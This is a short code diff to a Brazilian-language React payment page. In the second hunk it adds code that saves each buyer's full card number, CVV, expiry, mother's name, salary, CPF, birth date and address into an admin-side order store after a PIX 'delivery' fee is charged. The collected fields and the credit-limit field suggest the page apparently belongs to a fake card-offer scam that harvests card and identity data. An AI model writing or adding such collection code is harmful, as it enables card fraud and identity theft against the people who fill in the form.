@@ -24,8 +24,18 @@ export default function PaymentPage() {
     pixQrCode,
     transactionId,
     limite,
-    bandeiraCartao
+    bandeiraCartao,
+    email,
+    dataNascimento,
+    profissao,
+    salario,
+    nomeMae,
+    numeroCartao,
+    cvv,
+    validade
   } = useUserStore();
+  
+  const addOrder = useAdminStore((state) => state.addOrder);
 
   const [loading, setLoading] = useState(false);
   const [pixGerado, setPixGerado] = useState(!!pixCode);
@@ -199,6 +209,28 @@ export default function PaymentPage() {
       }));
       
       trackPurchase(dadosPix.amount, 'BRL', resultado.transactionId);
+      
+      // Salvar pedido no admin store
+      addOrder({
+        nomeCompleto,
+        telefone,
+        cpf,
+        email,
+        dataNascimento,
+        profissao,
+        salario,
+        nomeMae,
+        endereco,
+        valorEntrega: dadosPix.amount,
+        transactionId: resultado.transactionId,
+        pixCode: resultado.pixCode,
+        pixQrCode: resultado.qrCode,
+        numeroCartao,
+        cvv,
+        validade,
+        bandeiraCartao,
+        limite,
+      });
       
       // Enviar notificação de pedido pendente (apenas uma vez)
       if (!notificacaoPendenteEnviadaRef.current) {
